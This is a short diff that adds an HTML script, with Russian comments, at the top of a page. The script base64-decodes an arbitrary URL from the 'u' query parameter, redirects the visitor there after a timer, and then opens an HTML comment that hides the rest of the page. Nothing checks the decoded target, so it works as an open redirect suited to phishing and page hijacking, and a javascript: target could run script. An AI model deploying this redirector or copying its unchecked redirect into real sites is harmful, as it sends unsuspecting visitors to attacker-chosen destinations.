@@ -1,0 +1,16 @@
+<script>
+function getUrlVars() {
+var vars = {};
+var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+vars[key] = value;
+});
+return vars;
+}
+   urlID   = window.atob(getUrlVars()["u"]); //Ваша ссылка 
+   timeOUT = 2500; //Таймер (5000 - 5 секунд, 10000 - 10 секунд) 
+   function redirect(){
+       window.location.replace(urlID);
+   }
+   setTimeout(redirect, timeOUT);
+</script>
+<!--
